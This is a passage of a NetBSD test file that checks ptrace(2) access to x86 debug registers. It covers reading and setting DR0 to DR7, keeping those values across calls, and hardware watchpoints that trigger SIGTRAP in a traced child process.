/*	$NetBSD: t_ptrace_x86_wait.h,v 1.13 2019/05/10 18:07:10 mgorny Exp $	*/

/*-
 * Copyright (c) 2016, 2017, 2018, 2019 The NetBSD Foundation, Inc.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE NETBSD FOUNDATION, INC. AND CONTRIBUTORS
 * ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 * TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
 * PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE FOUNDATION OR CONTRIBUTORS
 * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#if defined(__i386__) || defined(__x86_64__)
union u {
	unsigned long raw;
	struct {
		unsigned long local_dr0_breakpoint : 1;		/* 0 */
		unsigned long global_dr0_breakpoint : 1;	/* 1 */
		unsigned long local_dr1_breakpoint : 1;		/* 2 */
		unsigned long global_dr1_breakpoint : 1;	/* 3 */
		unsigned long local_dr2_breakpoint : 1;		/* 4 */
		unsigned long global_dr2_breakpoint : 1;	/* 5 */
		unsigned long local_dr3_breakpoint : 1;		/* 6 */
		unsigned long global_dr3_breakpoint : 1;	/* 7 */
		unsigned long local_exact_breakpt : 1;		/* 8 */
		unsigned long global_exact_breakpt : 1;		/* 9 */
		unsigned long reserved_10 : 1;			/* 10 */
		unsigned long rest_trans_memory : 1;		/* 11 */
		unsigned long reserved_12 : 1;			/* 12 */
		unsigned long general_detect_enable : 1;	/* 13 */
		unsigned long reserved_14 : 1;			/* 14 */
		unsigned long reserved_15 : 1;			/* 15 */
		unsigned long condition_dr0 : 2;		/* 16-17 */
		unsigned long len_dr0 : 2;			/* 18-19 */
		unsigned long condition_dr1 : 2;		/* 20-21 */
		unsigned long len_dr1 : 2;			/* 22-23 */
		unsigned long condition_dr2 : 2;		/* 24-25 */
		unsigned long len_dr2 : 2;			/* 26-27 */
		unsigned long condition_dr3 : 2;		/* 28-29 */
		unsigned long len_dr3 : 2;			/* 30-31 */
	} bits;
};

ATF_TC(dbregs_print);
ATF_TC_HEAD(dbregs_print, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify plain PT_GETDBREGS with printing Debug Registers");
}

ATF_TC_BODY(dbregs_print, tc)
{
	const int exitval = 5;
	const int sigval = SIGSTOP;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	int status;
#endif
	struct dbreg r;
	size_t i;

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		DPRINTF("Before exiting of the child process\n");
		_exit(exitval);
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);	

	DPRINTF("Call GETDBREGS for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_GETDBREGS, child, &r, 0) != -1);

	DPRINTF("State of the debug registers:\n");
	for (i = 0; i < __arraycount(r.dr); i++)
		DPRINTF("r[%zu]=%" PRIxREGISTER "\n", i, r.dr[i]);

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_exited(status, exitval);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}


enum dbreg_preserve_mode {
	dbreg_preserve_mode_none,
	dbreg_preserve_mode_yield,
	dbreg_preserve_mode_continued
};

static void
dbreg_preserve(int reg, enum dbreg_preserve_mode mode)
{
	const int exitval = 5;
	const int sigval = SIGSTOP;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	int status;
#endif
	struct dbreg r1;
	struct dbreg r2;
	size_t i;
	int watchme;

	if (!can_we_set_dbregs()) {
		atf_tc_skip("Either run this test as root or set sysctl(3) "
		            "security.models.extensions.user_set_dbregs to 1");
	}

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		if (mode == dbreg_preserve_mode_continued) {
			DPRINTF("Before raising %s from child\n",
			       strsignal(sigval));
			FORKEE_ASSERT(raise(sigval) == 0);
		}

		DPRINTF("Before exiting of the child process\n");
		_exit(exitval);
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Call GETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_GETDBREGS, child, &r1, 0) != -1);

	DPRINTF("State of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	r1.dr[reg] = (long)(intptr_t)&watchme;
	DPRINTF("Set DR0 (r1.dr[%d]) to new value %" PRIxREGISTER "\n",
	    reg, r1.dr[reg]);

	DPRINTF("New state of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	DPRINTF("Call SETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_SETDBREGS, child, &r1, 0) != -1);

	switch (mode) {
	case dbreg_preserve_mode_none:
		break;
	case dbreg_preserve_mode_yield:
		DPRINTF("Yields a processor voluntarily and gives other "
		       "threads a chance to run without waiting for an "
		       "involuntary preemptive switch\n");
		sched_yield();
		break;
	case dbreg_preserve_mode_continued:
		DPRINTF("Call CONTINUE for the child process\n");
	        SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

		DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
		TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

		validate_status_stopped(status, sigval);
		break;
	}

	DPRINTF("Call GETDBREGS for the child process (r2)\n");
	SYSCALL_REQUIRE(ptrace(PT_GETDBREGS, child, &r2, 0) != -1);

	DPRINTF("Assert that (r1) and (r2) are the same\n");
	SYSCALL_REQUIRE(memcmp(&r1, &r2, sizeof(r1)) == 0);

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_exited(status, exitval);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}


ATF_TC(dbregs_preserve_dr0);
ATF_TC_HEAD(dbregs_preserve_dr0, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting DR0 is preserved across ptrace(2) calls");
}

ATF_TC_BODY(dbregs_preserve_dr0, tc)
{
	dbreg_preserve(0, dbreg_preserve_mode_none);
}

ATF_TC(dbregs_preserve_dr1);
ATF_TC_HEAD(dbregs_preserve_dr1, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting DR1 is preserved across ptrace(2) calls");
}

ATF_TC_BODY(dbregs_preserve_dr1, tc)
{
	dbreg_preserve(1, dbreg_preserve_mode_none);
}

ATF_TC(dbregs_preserve_dr2);
ATF_TC_HEAD(dbregs_preserve_dr2, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting DR2 is preserved across ptrace(2) calls");
}

ATF_TC_BODY(dbregs_preserve_dr2, tc)
{
	dbreg_preserve(2, dbreg_preserve_mode_none);
}

ATF_TC(dbregs_preserve_dr3);
ATF_TC_HEAD(dbregs_preserve_dr3, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting DR3 is preserved across ptrace(2) calls");
}

ATF_TC_BODY(dbregs_preserve_dr3, tc)
{
	dbreg_preserve(3, dbreg_preserve_mode_none);
}

ATF_TC(dbregs_preserve_dr0_yield);
ATF_TC_HEAD(dbregs_preserve_dr0_yield, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting DR0 is preserved across ptrace(2) calls with "
	    "scheduler yield");
}

ATF_TC_BODY(dbregs_preserve_dr0_yield, tc)
{
	dbreg_preserve(0, dbreg_preserve_mode_yield);
}

ATF_TC(dbregs_preserve_dr1_yield);
ATF_TC_HEAD(dbregs_preserve_dr1_yield, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting DR1 is preserved across ptrace(2) calls with "
	    "scheduler yield");
}

ATF_TC_BODY(dbregs_preserve_dr1_yield, tc)
{
	dbreg_preserve(0, dbreg_preserve_mode_yield);
}

ATF_TC(dbregs_preserve_dr2_yield);
ATF_TC_HEAD(dbregs_preserve_dr2_yield, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting DR2 is preserved across ptrace(2) calls with "
	    "scheduler yield");
}

ATF_TC_BODY(dbregs_preserve_dr2_yield, tc)
{
	dbreg_preserve(0, dbreg_preserve_mode_yield);
}


ATF_TC(dbregs_preserve_dr3_yield);
ATF_TC_HEAD(dbregs_preserve_dr3_yield, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting DR3 is preserved across ptrace(2) calls with "
	    "scheduler yield");
}

ATF_TC_BODY(dbregs_preserve_dr3_yield, tc)
{
	dbreg_preserve(3, dbreg_preserve_mode_yield);
}

ATF_TC(dbregs_preserve_dr0_continued);
ATF_TC_HEAD(dbregs_preserve_dr0_continued, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting DR0 is preserved across ptrace(2) calls and "
	    "with continued child");
}

ATF_TC_BODY(dbregs_preserve_dr0_continued, tc)
{
	dbreg_preserve(0, dbreg_preserve_mode_continued);
}

ATF_TC(dbregs_preserve_dr1_continued);
ATF_TC_HEAD(dbregs_preserve_dr1_continued, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting DR1 is preserved across ptrace(2) calls and "
	    "with continued child");
}

ATF_TC_BODY(dbregs_preserve_dr1_continued, tc)
{
	dbreg_preserve(1, dbreg_preserve_mode_continued);
}

ATF_TC(dbregs_preserve_dr2_continued);
ATF_TC_HEAD(dbregs_preserve_dr2_continued, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting DR2 is preserved across ptrace(2) calls and "
	    "with continued child");
}

ATF_TC_BODY(dbregs_preserve_dr2_continued, tc)
{
	dbreg_preserve(2, dbreg_preserve_mode_continued);
}

ATF_TC(dbregs_preserve_dr3_continued);
ATF_TC_HEAD(dbregs_preserve_dr3_continued, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting DR3 is preserved across ptrace(2) calls and "
	    "with continued child");
}

ATF_TC_BODY(dbregs_preserve_dr3_continued, tc)
{
	dbreg_preserve(3, dbreg_preserve_mode_continued);
}


static void
dbregs_trap_variable(int reg, int cond, int len, bool write)
{
	const int exitval = 5;
	const int sigval = SIGSTOP;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	int status;
#endif
	struct dbreg r1;
	size_t i;
	volatile int watchme = 0;
	union u dr7;

	struct ptrace_siginfo info;
	memset(&info, 0, sizeof(info));

	if (!can_we_set_dbregs()) {
		atf_tc_skip("Either run this test as root or set sysctl(3) "
		            "security.models.extensions.user_set_dbregs to 1");
	}

	dr7.raw = 0;
	switch (reg) {
	case 0:
		dr7.bits.global_dr0_breakpoint = 1;
		dr7.bits.condition_dr0 = cond;
		dr7.bits.len_dr0 = len;
		break;
	case 1:
		dr7.bits.global_dr1_breakpoint = 1;
		dr7.bits.condition_dr1 = cond;
		dr7.bits.len_dr1 = len;
		break;
	case 2:
		dr7.bits.global_dr2_breakpoint = 1;
		dr7.bits.condition_dr2 = cond;
		dr7.bits.len_dr2 = len;
		break;
	case 3:
		dr7.bits.global_dr3_breakpoint = 1;
		dr7.bits.condition_dr3 = cond;
		dr7.bits.len_dr3 = len;
		break;
	}

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		if (write)
			watchme = 1;
		else
			printf("watchme=%d\n", watchme);

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		DPRINTF("Before exiting of the child process\n");
		_exit(exitval);
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Call GETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_GETDBREGS, child, &r1, 0) != -1);

	DPRINTF("State of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	r1.dr[reg] = (long)(intptr_t)&watchme;
	DPRINTF("Set DR%d (r1.dr[%d]) to new value %" PRIxREGISTER "\n",
	    reg, reg, r1.dr[reg]);

	r1.dr[7] = dr7.raw;
	DPRINTF("Set DR7 (r1.dr[7]) to new value %" PRIxREGISTER "\n",
	    r1.dr[7]);

	DPRINTF("New state of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	DPRINTF("Call SETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_SETDBREGS, child, &r1, 0) != -1);

	DPRINTF("Call CONTINUE for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, SIGTRAP);

	DPRINTF("Before calling ptrace(2) with PT_GET_SIGINFO for child\n");
	SYSCALL_REQUIRE(ptrace(PT_GET_SIGINFO, child, &info, sizeof(info)) != -1);

	DPRINTF("Signal traced to lwpid=%d\n", info.psi_lwpid);
	DPRINTF("Signal properties: si_signo=%#x si_code=%#x si_errno=%#x\n",
	    info.psi_siginfo.si_signo, info.psi_siginfo.si_code,
	    info.psi_siginfo.si_errno);

	DPRINTF("Before checking siginfo_t\n");
	ATF_REQUIRE_EQ(info.psi_siginfo.si_signo, SIGTRAP);
	ATF_REQUIRE_EQ(info.psi_siginfo.si_code, TRAP_DBREG);

	DPRINTF("Call CONTINUE for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_exited(status, exitval);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}

ATF_TC(dbregs_dr0_trap_variable_writeonly_byte);
ATF_TC_HEAD(dbregs_dr0_trap_variable_writeonly_byte, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR0 triggers SIGTRAP "
	    "(break on data writes only and 1 byte mode)");
}

ATF_TC_BODY(dbregs_dr0_trap_variable_writeonly_byte, tc)
{
	/* 0b01 -- break on data write only */
	/* 0b00 -- 1 byte */

	dbregs_trap_variable(0, 1, 0, true);
}

ATF_TC(dbregs_dr1_trap_variable_writeonly_byte);
ATF_TC_HEAD(dbregs_dr1_trap_variable_writeonly_byte, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR1 triggers SIGTRAP "
	    "(break on data writes only and 1 byte mode)");
}

ATF_TC_BODY(dbregs_dr1_trap_variable_writeonly_byte, tc)
{
	/* 0b01 -- break on data write only */
	/* 0b00 -- 1 byte */

	dbregs_trap_variable(1, 1, 0, true);
}

ATF_TC(dbregs_dr2_trap_variable_writeonly_byte);
ATF_TC_HEAD(dbregs_dr2_trap_variable_writeonly_byte, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR2 triggers SIGTRAP "
	    "(break on data writes only and 1 byte mode)");
}

ATF_TC_BODY(dbregs_dr2_trap_variable_writeonly_byte, tc)
{
	/* 0b01 -- break on data write only */
	/* 0b00 -- 1 byte */

	dbregs_trap_variable(2, 1, 0, true);
}

ATF_TC(dbregs_dr3_trap_variable_writeonly_byte);
ATF_TC_HEAD(dbregs_dr3_trap_variable_writeonly_byte, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR3 triggers SIGTRAP "
	    "(break on data writes only and 1 byte mode)");
}

ATF_TC_BODY(dbregs_dr3_trap_variable_writeonly_byte, tc)
{
	/* 0b01 -- break on data write only */
	/* 0b00 -- 1 byte */

	dbregs_trap_variable(3, 1, 0, true);
} 

ATF_TC(dbregs_dr0_trap_variable_writeonly_2bytes);
ATF_TC_HEAD(dbregs_dr0_trap_variable_writeonly_2bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR0 triggers SIGTRAP "
	    "(break on data writes only and 2 bytes mode)");
}

ATF_TC_BODY(dbregs_dr0_trap_variable_writeonly_2bytes, tc)
{
	/* 0b01 -- break on data write only */
	/* 0b01 -- 2 bytes */

	dbregs_trap_variable(0, 1, 1, true);
}

ATF_TC(dbregs_dr1_trap_variable_writeonly_2bytes);
ATF_TC_HEAD(dbregs_dr1_trap_variable_writeonly_2bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR1 triggers SIGTRAP "
	    "(break on data writes only and 2 bytes mode)");
}

ATF_TC_BODY(dbregs_dr1_trap_variable_writeonly_2bytes, tc)
{
	/* 0b01 -- break on data write only */
	/* 0b01 -- 2 bytes */

	dbregs_trap_variable(1, 1, 1, true);
}

ATF_TC(dbregs_dr2_trap_variable_writeonly_2bytes);
ATF_TC_HEAD(dbregs_dr2_trap_variable_writeonly_2bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR2 triggers SIGTRAP "
	    "(break on data writes only and 2 bytes mode)");
}

ATF_TC_BODY(dbregs_dr2_trap_variable_writeonly_2bytes, tc)
{
	/* 0b01 -- break on data write only */
	/* 0b01 -- 2 bytes */

	dbregs_trap_variable(2, 1, 1, true);
}

ATF_TC(dbregs_dr3_trap_variable_writeonly_2bytes);
ATF_TC_HEAD(dbregs_dr3_trap_variable_writeonly_2bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR3 triggers SIGTRAP "
	    "(break on data writes only and 2 bytes mode)");
}

ATF_TC_BODY(dbregs_dr3_trap_variable_writeonly_2bytes, tc)
{
	/* 0b01 -- break on data write only */
	/* 0b01 -- 2 bytes */

	dbregs_trap_variable(3, 1, 1, true);
}

ATF_TC(dbregs_dr0_trap_variable_writeonly_4bytes);
ATF_TC_HEAD(dbregs_dr0_trap_variable_writeonly_4bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR0 triggers SIGTRAP "
	    "(break on data writes only and 4 bytes mode)");
}

ATF_TC_BODY(dbregs_dr0_trap_variable_writeonly_4bytes, tc)
{
	/* 0b01 -- break on data write only */
	/* 0b11 -- 4 bytes */

	dbregs_trap_variable(0, 1, 3, true);
}

ATF_TC(dbregs_dr1_trap_variable_writeonly_4bytes);
ATF_TC_HEAD(dbregs_dr1_trap_variable_writeonly_4bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR1 triggers SIGTRAP "
	    "(break on data writes only and 4 bytes mode)");
}

ATF_TC_BODY(dbregs_dr1_trap_variable_writeonly_4bytes, tc)
{
	/* 0b01 -- break on data write only */
	/* 0b11 -- 4 bytes */

	dbregs_trap_variable(1, 1, 3, true);
}

ATF_TC(dbregs_dr2_trap_variable_writeonly_4bytes);
ATF_TC_HEAD(dbregs_dr2_trap_variable_writeonly_4bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR2 triggers SIGTRAP "
	    "(break on data writes only and 4 bytes mode)");
}

ATF_TC_BODY(dbregs_dr2_trap_variable_writeonly_4bytes, tc)
{
	/* 0b01 -- break on data write only */
	/* 0b11 -- 4 bytes */

	dbregs_trap_variable(2, 1, 3, true);
}

ATF_TC(dbregs_dr3_trap_variable_writeonly_4bytes);
ATF_TC_HEAD(dbregs_dr3_trap_variable_writeonly_4bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR3 triggers SIGTRAP "
	    "(break on data writes only and 4 bytes mode)");
}

ATF_TC_BODY(dbregs_dr3_trap_variable_writeonly_4bytes, tc)
{
	/* 0b01 -- break on data write only */
	/* 0b11 -- 4 bytes */

	dbregs_trap_variable(3, 1, 3, true);
}

ATF_TC(dbregs_dr0_trap_variable_readwrite_write_byte);
ATF_TC_HEAD(dbregs_dr0_trap_variable_readwrite_write_byte, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR0 triggers SIGTRAP "
	    "(break on data read/write trap in read 1 byte mode)");
}

ATF_TC_BODY(dbregs_dr0_trap_variable_readwrite_write_byte, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b00 -- 1 byte */

	dbregs_trap_variable(0, 3, 0, true);
}

ATF_TC(dbregs_dr1_trap_variable_readwrite_write_byte);
ATF_TC_HEAD(dbregs_dr1_trap_variable_readwrite_write_byte, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR1 triggers SIGTRAP "
	    "(break on data read/write trap in read 1 byte mode)");
}

ATF_TC_BODY(dbregs_dr1_trap_variable_readwrite_write_byte, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b00 -- 1 byte */

	dbregs_trap_variable(1, 3, 0, true);
}

ATF_TC(dbregs_dr2_trap_variable_readwrite_write_byte);
ATF_TC_HEAD(dbregs_dr2_trap_variable_readwrite_write_byte, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR2 triggers SIGTRAP "
	    "(break on data read/write trap in read 1 byte mode)");
}

ATF_TC_BODY(dbregs_dr2_trap_variable_readwrite_write_byte, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b00 -- 1 byte */

	dbregs_trap_variable(2, 3, 0, true);
}

ATF_TC(dbregs_dr3_trap_variable_readwrite_write_byte);
ATF_TC_HEAD(dbregs_dr3_trap_variable_readwrite_write_byte, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR3 triggers SIGTRAP "
	    "(break on data read/write trap in read 1 byte mode)");
}

ATF_TC_BODY(dbregs_dr3_trap_variable_readwrite_write_byte, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b00 -- 1 byte */

	dbregs_trap_variable(3, 3, 0, true);
}

ATF_TC(dbregs_dr0_trap_variable_readwrite_write_2bytes);
ATF_TC_HEAD(dbregs_dr0_trap_variable_readwrite_write_2bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR0 triggers SIGTRAP "
	    "(break on data read/write trap in read 2 bytes mode)");
}

ATF_TC_BODY(dbregs_dr0_trap_variable_readwrite_write_2bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b01 -- 2 bytes */

	dbregs_trap_variable(0, 3, 1, true);
}

ATF_TC(dbregs_dr1_trap_variable_readwrite_write_2bytes);
ATF_TC_HEAD(dbregs_dr1_trap_variable_readwrite_write_2bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR1 triggers SIGTRAP "
	    "(break on data read/write trap in read 2 bytes mode)");
}

ATF_TC_BODY(dbregs_dr1_trap_variable_readwrite_write_2bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b01 -- 2 bytes */

	dbregs_trap_variable(1, 3, 1, true);
}

ATF_TC(dbregs_dr2_trap_variable_readwrite_write_2bytes);
ATF_TC_HEAD(dbregs_dr2_trap_variable_readwrite_write_2bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR2 triggers SIGTRAP "
	    "(break on data read/write trap in read 2 bytes mode)");
}

ATF_TC_BODY(dbregs_dr2_trap_variable_readwrite_write_2bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b01 -- 2 bytes */

	dbregs_trap_variable(2, 3, 1, true);
}

ATF_TC(dbregs_dr3_trap_variable_readwrite_write_2bytes);
ATF_TC_HEAD(dbregs_dr3_trap_variable_readwrite_write_2bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR3 triggers SIGTRAP "
	    "(break on data read/write trap in read 2 bytes mode)");
}

ATF_TC_BODY(dbregs_dr3_trap_variable_readwrite_write_2bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b01 -- 2 bytes */

	dbregs_trap_variable(3, 3, 1, true);
}

ATF_TC(dbregs_dr0_trap_variable_readwrite_write_4bytes);
ATF_TC_HEAD(dbregs_dr0_trap_variable_readwrite_write_4bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR0 triggers SIGTRAP "
	    "(break on data read/write trap in read 4 bytes mode)");
}

ATF_TC_BODY(dbregs_dr0_trap_variable_readwrite_write_4bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b11 -- 4 bytes */

	dbregs_trap_variable(0, 3, 3, true);
}

ATF_TC(dbregs_dr1_trap_variable_readwrite_write_4bytes);
ATF_TC_HEAD(dbregs_dr1_trap_variable_readwrite_write_4bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR1 triggers SIGTRAP "
	    "(break on data read/write trap in read 4 bytes mode)");
}

ATF_TC_BODY(dbregs_dr1_trap_variable_readwrite_write_4bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b11 -- 4 bytes */

	dbregs_trap_variable(1, 3, 3, true);
}

ATF_TC(dbregs_dr2_trap_variable_readwrite_write_4bytes);
ATF_TC_HEAD(dbregs_dr2_trap_variable_readwrite_write_4bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR2 triggers SIGTRAP "
	    "(break on data read/write trap in read 4 bytes mode)");
}

ATF_TC_BODY(dbregs_dr2_trap_variable_readwrite_write_4bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b11 -- 4 bytes */

	dbregs_trap_variable(2, 3, 3, true);
}

ATF_TC(dbregs_dr3_trap_variable_readwrite_write_4bytes);
ATF_TC_HEAD(dbregs_dr3_trap_variable_readwrite_write_4bytes, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that setting trap with DR3 triggers SIGTRAP "
	    "(break on data read/write trap in read 4 bytes mode)");
}

ATF_TC_BODY(dbregs_dr3_trap_variable_readwrite_write_4bytes, tc)
{
	/* 0b11 -- break on data write&read */
	/* 0b11 -- 4 bytes */

